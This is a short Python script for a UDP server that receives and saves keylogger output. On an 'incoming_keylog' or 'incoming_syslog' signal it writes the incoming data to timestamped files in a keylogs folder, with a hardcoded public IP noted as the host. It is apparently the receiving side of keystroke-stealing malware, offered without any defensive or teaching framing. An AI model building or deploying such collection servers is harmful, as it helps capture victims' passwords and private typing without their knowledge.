#File Sever
import socket
import os
import fileinput
import sys
from datetime import datetime
import threading


#setting up the server
udp_port = 25005
buffer_size = 1024
serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
host = '35.231.244.179' #this used for local tests

#setting up host to listen for connections
serversocket.bind(('', udp_port))
print("Server started on " + host + " on port " + str(udp_port) + "\n")

openFile = False

def close_file():
    global openFile
    openFile = False
    print("No connection received for 20s, connection timing out.")

#accepting a connection
while(True):
    data, addr = serversocket.recvfrom(buffer_size)
    now = datetime.now()
    current_time = now.strftime("%H_%M_%S")
    if data.decode() == "incoming_keylog":
        filename = ("./keylogs/" + current_time + "_keylog.txt")
    elif data.decode() == "incoming_syslog":
        filename = ("./keylogs/" + current_time + "_syslog.txt")
    else:
        print("Received bad data.\n")
        break
    f = open (filename, 'wb')
    print("Connection established. Awaiting transmission.\n")
    openFile = True
    timeout_timer = threading.Timer(20.0, close_file)
    timeout_timer.start()
    while(openFile):
        l, addr = serversocket.recvfrom(buffer_size)
        f.write(l)
    f.close()

    
    

serversocket.close()


